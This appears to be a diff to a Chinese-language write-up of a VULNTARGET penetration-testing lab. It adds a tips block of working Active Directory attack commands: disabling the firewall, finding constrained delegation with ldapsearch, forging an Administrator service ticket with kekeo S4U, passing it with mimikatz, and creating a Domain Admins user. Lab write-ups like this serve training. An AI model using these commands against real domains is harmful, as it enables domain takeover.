@@ -714,6 +714,8 @@ win2008   VULNTARGET  qweASD123
 
 ### 伪造票据
 
+- 这里相对比较繁琐,在面临代理频繁断开连接,卡顿,复制粘贴,重复多次导票据,会话挂掉等很多问题…所以截图少了部分
+
 ```cmd
 netsh advfirewall set allprofiles state off
 
@@ -781,3 +783,52 @@ shell type C:\flag.txt.txt
 - 至此所有主机已上线,最终完整拓扑图
 
 ![image-20251209180153757](./assets/image-20251209180153757.png)
+
+******
+
+### 命令Tips
+
+```cmd
+# 1. 绕过“密码已过期”继续用原口令（kinit 交互失败时）-----> 极有可能遇到
+# 1.1 给 krb5.conf 写静态 KDC（已做）
+cat >> /etc/krb5.conf <<'EOF'
+[realms]
+ SEC.ORG = {
+  kdc = 192.168.1.100
+  admin_server = 192.168.1.100
+ }
+[domain_realm]
+ .sec.org = SEC.ORG
+ sec.org = SEC.ORG
+EOF
+
+# 1.2 再次 kinit（原口令）,输入原口令 → 提示 expired → 输入新密码修改
+proxychains4 kinit mht@SEC.ORG
+
+# 2. 查询域委派（约束性）
+ldapsearch -x -H ldap://192.168.1.100 \
+  -D "mht@sec.org" -w "a1b2c3.." \
+  -b "DC=sec,DC=org" \
+  "(&(samAccountType=805306368)(msDS-AllowedToDelegateto=*))" \
+  distinguishedName msDS-AllowedToDelegateto
+
+# 3. kekeo 申请 TGT + S4U 伪造
+tgt::ask /user:mht /domain:sec.org /password:a1b2c3.. /ticket:mht.kirbi
+tgs::s4u /tgt:TGT_mht@SEC.ORG_krbtgt~sec.org@SEC.ORG.kirbi \
+         /user:Administrator@sec.org \
+         /service:cifs/DC.sec.org
+
+# 4. mimikatz 导入票据 & 验证 (!!!!每执行完一次命令都需要重新导入)
+privilege::debug
+kerberos::ptt TGS_Administrator@sec.org@SEC.ORG_cifs~DC.sec.org@SEC.ORG.kirbi
+dir \\DC.sec.org\c$
+
+# 5. 创建域用户并加进 Domain Admins
+net user tomato A1B2C3.. /add /domain
+net group "Domain Admins" tomato /add /domain
+
+# 6. 查询域 flag（已拿到票据后）
+type \\DC.sec.org\c$\flag.txt
+```
+
+******
